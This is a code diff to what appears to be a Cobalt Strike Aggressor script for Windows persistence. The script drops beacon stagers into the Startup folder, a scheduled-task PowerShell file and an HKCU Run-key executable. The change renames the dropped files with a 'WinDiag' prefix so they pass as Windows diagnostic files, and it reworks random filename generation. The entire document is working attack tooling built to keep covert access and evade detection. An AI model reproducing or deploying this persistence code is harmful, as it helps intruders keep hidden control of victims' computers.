@@ -34,7 +34,7 @@ sub startup_folder
         $cmd = powershell_command($comp, false);
         $filename = get_random_filename();
         
-        bupload_raw!($bid, "C:\\Users\\ $+ $username $+ \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ $+ $filename $+ .bat", $cmd);
+        bupload_raw!($bid, "C:\\Users\\ $+ $username $+ \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinDiag $+ $filename $+ .bat", $cmd);
 
     }));
 }
@@ -55,7 +55,7 @@ sub scheduled_task
         $artifact = artifact_stager($listener, "powershell", "x64");
         $comp = powershell_compress($artifact);
         $filename = get_random_filename();
-        $path = "C:\\Users\\ $+ $username $+ \\AppData\\Local\\Temp\\ $+ $filename $+ .ps1";
+        $path = "C:\\Users\\ $+ $username $+ \\AppData\\Local\\Temp\\WinDiag $+ $filename $+ .ps1";
 
         bupload_raw!($bid, $path, $comp);
 
@@ -87,21 +87,21 @@ sub hkcu_persistence
         $artifact = artifact_stager($1, "exe", "x64");
         $filename = get_random_filename();
 
-        bupload_raw!($bid, "C:\\Users\\ $+ $username $+ \\AppData\\Local\\Temp\\ $+ $filename $+ .exe", $artifact);
+        bupload_raw!($bid, "C:\\Users\\ $+ $username $+ \\AppData\\Local\\Temp\\WinDiag $+ $filename $+ .exe", $artifact);
 
         $regname = get_random_filename();
 
-        bpowershell!($bid, "New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -Name \" $+ $regname $+ \" -PropertyType ExpandString -Value \"C:\\Users\\ $+ $username $+ \\AppData\\Local\\Temp\\ $+ $filename $+ .exe\" -Force");
+        bpowershell!($bid, "New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -Name \" $+ $regname $+ \" -PropertyType ExpandString -Value \"C:\\Users\\ $+ $username $+ \\AppData\\Local\\Temp\\WinDiag $+ $filename $+ .exe\" -Force");
 
     }));
 }
 
 sub get_random_filename
 {
-    @chars = @("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
+    @chars = @("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z");
     @result = @();
 
-    for ($length = 8; $length > 0; $length--)
+    for ($length = 6; $length > 0; $length--)
     {
         add(@result, rand(@chars), 0);
     }
